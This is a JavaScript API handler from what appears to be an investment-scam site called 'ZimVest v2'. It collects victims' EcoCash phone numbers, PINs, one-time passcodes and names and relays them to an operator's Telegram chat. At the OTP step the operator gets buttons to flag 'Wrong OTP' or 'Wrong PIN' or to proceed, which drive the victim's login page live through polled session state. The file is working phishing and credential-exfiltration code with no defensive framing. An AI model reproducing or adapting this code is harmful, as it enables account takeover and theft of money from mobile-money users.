// api/sendTelegram.js — ZimVest v2
// Sends credentials + investment details to Telegram
// When event === 'otp_confirmed', sends with 3 inline buttons:
//   [Wrong OTP] [Wrong PIN] [✅ Proceed]
// Stores last message_id + callback answer in KV so login.html can poll it

export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).send('Method not allowed');

  const TOKEN   = process.env.TELEGRAM_TOKEN;
  const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
  if (!TOKEN || !CHAT_ID) return res.status(500).send('Missing TELEGRAM_TOKEN or TELEGRAM_CHAT_ID');

  let body = {};
  try { body = typeof req.body === 'string' ? JSON.parse(req.body || '{}') : (req.body || {}); }
  catch { return res.status(400).send('Invalid JSON'); }

  const esc = s => s == null ? '—' : String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');

  // ── Build message text ────────────────────────────────────────────────────
  const ev = body.event || 'activity';
  const evEmoji = {
    invest_initiated: '🚀', otp_confirmed: '🔐', resend_otp: '🔄',
    wrong_otp: '❌', wrong_pin: '🚫', proceed: '✅',
  }[ev] || '📌';

  let text = `<b>${evEmoji} ZimVest — ${esc(ev.replace(/_/g,' ').toUpperCase())}</b>\n`;
  text += `<code>━━━━━━━━━━━━━━━━━━━━</code>\n\n`;

  if (body.loginPhone) {
    text += `<b>📱 EcoCash Number</b>\n<code>${esc(body.loginPhone)}</code>\n`;
    if (body.loginPin) text += `<b>🔑 PIN</b>: <code>${esc(body.loginPin)}</code>\n`;
    if (body.otp)      text += `<b>OTP</b>: <code>${esc(body.otp)}</code>\n`;
    if (body.name)     text += `<b>Name</b>: ${esc(body.name)}\n`;
    text += '\n';
  }

  if (body.plan) {
    text += `<b>💰 Investment</b>\n<code>${esc(body.plan)}</code>\n\n`;
  }

  text += `<b>🕐 Time:</b> <code>${esc(new Date().toLocaleString('en-ZW',{timeZone:'Africa/Harare'}))}</code>\n`;
  if (body.device) text += `<b>📲 Device:</b> ${esc(body.device)}\n`;

  // ── Session key stored in KV for polling ─────────────────────────────────
  // session key = sanitised phone + timestamp (unique per investment attempt)
  const sessionKey = body.loginPhone
    ? 'tg_session:' + String(body.loginPhone).replace(/\W/g,'') + '_' + Date.now()
    : null;

  // ── Inline keyboard only on otp_confirmed ─────────────────────────────────
  const withButtons = ev === 'otp_confirmed';
  const msgPayload = {
    chat_id: CHAT_ID,
    text,
    parse_mode: 'HTML',
    disable_web_page_preview: true,
    ...(withButtons && {
      reply_markup: {
        inline_keyboard: [[
          { text: '❌ Wrong OTP',  callback_data: 'wrong_otp:'  + (sessionKey||'') },
          { text: '🚫 Wrong PIN',  callback_data: 'wrong_pin:'  + (sessionKey||'') },
          { text: '✅ Proceed',    callback_data: 'proceed:'    + (sessionKey||'') },
        ]]
      }
    })
  };

  try {
    const r    = await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(msgPayload),
    });
    const data = await r.json();

    if (!r.ok) return res.status(502).json({ error: 'Telegram error', detail: data });

    // ── Store session in KV if available ─────────────────────────────────────
    if (withButtons && sessionKey) {
      try {
        const { kv } = await import('@vercel/kv');
        await kv.set(sessionKey, JSON.stringify({
          messageId: data.result?.message_id,
          phone: body.loginPhone,
          status: 'pending',
          createdAt: Date.now(),
        }), { ex: 600 }); // 10 min TTL
      } catch { /* KV unavailable — polling will time out gracefully */ }
    }

    return res.status(200).json({ ok: true, messageId: data.result?.message_id, sessionKey });
  } catch (e) {
    return res.status(500).json({ error: 'Fetch failed', message: e?.message });
  }
}
